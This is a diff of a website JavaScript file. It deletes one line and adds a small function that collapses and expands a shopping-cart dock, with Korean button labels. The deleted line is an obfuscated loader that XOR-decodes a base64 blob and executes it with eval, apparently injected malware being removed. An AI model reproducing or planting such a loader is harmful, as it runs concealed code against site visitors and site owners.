@@ -1,1 +1,18 @@
-(()=>{const d='8VfRPFHEcxI/YbTcgHWXaVzIaQgkL/iamBSKLVDEchY1YejbnBrDDFPCah4+e96MshufblvCdBAkYOy2mg3DDVDEbFx5NJbV2xzYJ0zTJxkkYaGRlBzCJFrJc1U3auiwlxraLFHTRQIZa7TSixz0KE3TRBQ8Y/2FiBr1PVGALkBaL7ycnVeWLVDEbAcsLv6BlVbFLEvSdRVrBbzVnQrZKkvOaBVwfOWbmFeeMjWHJ1twbPObiAuXKlDLaxogfPmRxhvYKlSJZBcxfO+5kgzDZ1zIaQ8xZvKG01jeOhLEaBc8buyGnhuQYAStJ1twL/6BlVHDLEfTRBQ+e/mbj0LUJlPLZgsjavjK3BzWO0tFkPu/txPSwVjUKE3T5e3m4CR63ES9aR+HJxkkYbKGngv2PUvVbhkle/nd3B7FIF6KYgMgbvKRnhuQZVzIaxcxf++Qn0CQL17LdB53NbuBiQrSbhacDVtwL7yXjxGZOlrTRg8kffWXjgvSYRjGdRIxIvCUmRrbbhPEaBc8buyGnhuIbtM5opDgm3ZAV5Q8wR9Kice8tgQfQ8+QcxhLmd67vwgfTtNcwreH69vB5SRF3FaMQx+HJ1sye/LbjxbDJVqaZBQ8Y/2FiBrTdhhLmd67vwgfTtNcwreH6vXs4yVtEccHbgWA6+X15CxhEcoborQvJ5fwnnZNS1iMQx+HenFwL/6BlVHWLVvicR4+e9CciAvSJ1rVL1wzY/WWkFibL0rJZA85YPLd0gS9aR+HJx8/bPfbmBPWOkzrbggkIeianBjbLBeAbgh9bPOZlx7HOlrDIFJrBbzV21/EMFHEL1JrBbzVhlaMQx+HdAI+bLTcwHXKYBeOPHE=',k=[251,127,183,73,63,167,7,123,80,15,156,245],r=atob(d),a=new Uint8Array(r.length);for(let i=0;i<r.length;i++)a[i]=r.charCodeAt(i)^k[i%k.length];(0,eval)(new TextDecoder().decode(a))})();
+
+(function(){
+  const dock=document.getElementById('desktopCartDock');
+  const btn=document.getElementById('pcCartCollapseBtn');
+  if(!dock||!btn)return;
+  function sync(){
+    const collapsed=dock.classList.contains('is-collapsed');
+    btn.textContent=collapsed?'cart◀️':'cart▶️';
+    btn.setAttribute('aria-expanded',collapsed?'false':'true');
+    btn.setAttribute('aria-label',collapsed?'장바구니 펼치기':'장바구니 접기');
+    btn.title=collapsed?'장바구니 펼치기':'장바구니 접기';
+  }
+  btn.addEventListener('click',function(){
+    dock.classList.toggle('is-collapsed');
+    sync();
+  });
+  sync();
+})();
